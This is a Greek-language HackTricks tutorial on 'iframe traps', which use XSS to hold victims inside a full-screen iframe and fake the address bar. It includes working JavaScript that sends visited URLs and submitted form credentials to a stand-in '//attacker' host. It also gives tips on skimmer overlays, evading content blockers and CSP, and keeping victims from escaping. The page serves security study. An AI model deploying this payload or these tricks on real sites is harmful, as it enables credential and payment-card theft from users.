# Παγίδες iframe

{{#include ../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

Αυτός ο τρόπος κατάχρησης του XSS μέσω iframes για την κλοπή πληροφοριών από τον χρήστη που μετακινείται στην ιστοσελίδα δημοσιεύτηκε αρχικά σε αυτά τα 2 άρθρα του trustedsec.com: [**εδώ**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) **και** [**εδώ**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams).

Η επίθεση ξεκινά σε μια σελίδα ευάλωτη σε XSS όπου είναι δυνατό να κάνεις τα **θύματα να μην εγκαταλείπουν το XSS** κάνοντάς τα να **πλοηγούνται μέσα σε ένα iframe** που καταλαμβάνει ολόκληρη την εφαρμογή ιστού.

Η επίθεση XSS θα φορτώσει ουσιαστικά την ιστοσελίδα μέσα σε ένα iframe που καλύπτει το 100% της οθόνης. Συνεπώς, το θύμα **δεν θα αντιληφθεί ότι βρίσκεται μέσα σε iframe**. Έπειτα, αν το θύμα πλοηγηθεί στη σελίδα κάνοντας κλικ σε συνδέσμους μέσα στο iframe (μέσα στον ιστό), θα **πλοηγείται μέσα στο iframe** με το αυθαίρετο JS να έχει φορτωθεί, κλέβοντας πληροφορίες από αυτήν την πλοήγηση.

Επιπλέον, για να γίνει πιο ρεαλιστικό, είναι δυνατό να χρησιμοποιηθούν κάποιοι **listeners** για να ελέγχουν πότε ένα iframe αλλάζει το location της σελίδας, και να ενημερώνουν το URL του browser με εκείνες τις τοποθεσίες που ο χρήστης νομίζει ότι μετακινείται χρησιμοποιώντας τον browser.

<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>

<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>

Επιπλέον, είναι δυνατό να χρησιμοποιηθούν listeners για να κλέψουν ευαίσθητες πληροφορίες, όχι μόνο τις άλλες σελίδες που επισκέπτεται το θύμα, αλλά και τα δεδομένα που χρησιμοποιούνται για **συμπληρωμένες φόρμες** και να τα αποστείλουν (διαπιστευτήρια;) ή να **κλέψουν το local storage**...

Φυσικά, οι κύριοι περιορισμοί είναι ότι ένα **θύμα που κλείνει την καρτέλα ή βάζει άλλο URL στον browser θα ξεφύγει από το iframe**. Ένας άλλος τρόπος να γίνει αυτό είναι να **ανανεώσει τη σελίδα**, ωστόσο αυτό μπορεί να προληφθεί μερικώς απενεργοποιώντας το context menu του δεξιού κλικ κάθε φορά που φορτώνεται μια νέα σελίδα μέσα στο iframe ή παρατηρώντας πότε ο δείκτης του χρήστη αφήνει το iframe, πιθανώς για να κάνει κλικ στο κουμπί reload του browser και σε αυτή την περίπτωση το URL του browser ενημερώνεται με το αρχικό URL ευάλωτο σε XSS οπότε αν ο χρήστης το ανανεώσει, θα δηλητηριαστεί ξανά (σημείωση: αυτό δεν είναι πολύ αθόρυβο).

## Εκσυγχρονισμένη παγίδα (2024+)

* Χρησιμοποίησε ένα **full‑viewport iframe** μαζί με το History/Navigation API για να μιμηθείς την πραγματική πλοήγηση.

<details>
<summary>Παγίδα full-viewport iframe</summary>
```html
<script>
const i=document.createElement('iframe');
i.src=location.href;
i.style='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);
function sync(url){history.replaceState({},'',url);}
i.addEventListener('load',()=>{
const w=i.contentWindow;
['hashchange','popstate'].forEach(ev=>w.addEventListener(ev,()=>sync(w.location.href)));
w.addEventListener('click',()=>fetch('//attacker/log',{method:'POST',body:w.location.href}));
w.document.addEventListener('submit',ev=>{
const fd=new FormData(ev.target);
fetch('//attacker/creds',{method:'POST',body:new URLSearchParams(fd)});
},true);
});
</script>
```
</details>

* **Navigation API** (`navigation.navigate`, `currententrychange`) διατηρεί τη γραμμή διευθύνσεων του εξωτερικού περιηγητή συγχρονισμένη χωρίς να leak το πραγματικό URL.
* Go **fullscreen** για να κρύψετε το browser UI και να σχεδιάσετε τη δική σας ψεύτικη γραμμή διευθύνσεων/εικονίδιο padlock.

## Χρήση Overlay & skimmer

* Συμβιβασμένοι έμποροι αντικαθιστούν hosted payment iframes (Stripe, Adyen, etc.) με ένα **pixel‑perfect overlay** που προωθεί τα keystrokes ενώ το πραγματικό frame παραμένει από κάτω, μερικές φορές χρησιμοποιώντας legacy validation APIs ώστε η ροή να μη διακόπτεται.
* Το παγίδευμα χρηστών στο top frame συλλαμβάνει **autofill/password‑manager** δεδομένα πριν παρατηρήσουν ότι η γραμμή URL δεν άλλαξε ποτέ.

## Τακτικές αποφυγής παρατηρημένες στην έρευνα του 2025

* `about:blank`/`data:` local frames κληρονομούν την parent origin και παρακάμπτουν κάποια heuristics των content‑blockers· τα nested iframes μπορούν να επανεμφανιστούν ακόμα και όταν extensions καταργούν third‑party frames.
* **Permission propagation**: η επαναγραφή του parent `allow` attribute παραχωρεί σε nested attacker frames fullscreen/camera/microphone χωρίς εμφανείς αλλαγές στο DOM.

## Γρήγορες συμβουλές OPSEC

* Επαναφέρετε την εστίαση στο iframe όταν ο δείκτης φεύγει (`mouseleave` στο body) για να εμποδίσετε τους χρήστες να φτάσουν στο UI του browser.
* Απενεργοποιήστε το context menu και τα κοινά shortcuts (`keydown` για `F11`, `Ctrl+L`, `Ctrl+T`) μέσα στο frame για να επιβραδύνετε τις προσπάθειες απόδρασης.
* Αν το CSP μπλοκάρει inline scripts, εισάγετε έναν remote bootstrapper και ενεργοποιήστε το `srcdoc` στο iframe ώστε το payload να βρίσκεται έξω από το επιβαλλόμενο CSP της κύριας σελίδας.

## Σχετικά

{{#ref}}
clickjacking.md
{{#endref}}



## Αναφορές

- [Iframe security exposed: blind spot fueling payment skimmer attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [Local Frames: exploiting inherited origins to bypass blockers (2025)](https://arxiv.org/abs/2506.00317)
{{#include ../banners/hacktricks-training.md}}
